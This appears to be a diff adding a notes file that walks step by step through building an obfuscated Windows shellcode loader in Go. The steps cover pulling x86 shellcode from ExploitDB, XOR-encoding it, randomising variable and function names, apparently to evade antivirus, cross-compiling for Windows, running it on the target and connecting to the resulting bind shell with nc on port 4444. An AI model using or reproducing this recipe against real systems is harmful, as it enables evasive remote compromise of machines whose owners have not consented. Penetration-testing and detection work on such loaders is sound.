@@ -1,0 +1,49 @@
+#Install Golang 
+wget https://go.dev/dl/go1.20.2.linux-amd64.tar.gz
+sudo tar -C /usr/local -xvf go1.20.2.linux-amd64.tar.gz 
+sudo nano ~/.profile
+export PATH=$PATH:/usr/local/go/bin
+source ~/.profile
+
+
+#Setup Golang Environment 
+go env -w GO111MODULE=auto
+
+#From within source directory 
+go mod init tester
+go mod tidy
+
+
+#Get X86 Windows Shellcode from ExploitDB
+https://www.exploit-db.com/exploits/47980
+
+#Remove ;'s in front of the shellcode 
+#Use Python to transform shellcode into hex 
+''.join('%02x' % ord(c) for c in shellcode)
+
+
+#place hex into xor_shellcode.go
+#compile xor_shellcode.go and execute the binary 
+GOOS=linux GOARCH=amd64 go build xor_shellcode.go
+./xor_shellcode
+
+# copy key into loader.go 
+# copy shelllcode into shellcode.txt 
+#use tr and replace blank spaces with commas inbetween bytes 
+tr -s '[:blank:]' ',' <shellcode.txt
+
+#put shellcode bytes into loader.go
+
+--Optional - compile  random_name_generator.go and execute the binary 
+GOOS=linux GOARCH=amd64 go build random_name_generator.go
+
+#cp loader.go into random.go 
+#replace user defined variables and function names with random names 
+
+
+#Compile loader, transfer the binary to Windows machine, and run it 
+GOOS=windows GOARCH=386 go build random.go 
+
+#connect to the bind shell
+nc -nv <Windows IP> 4444
+
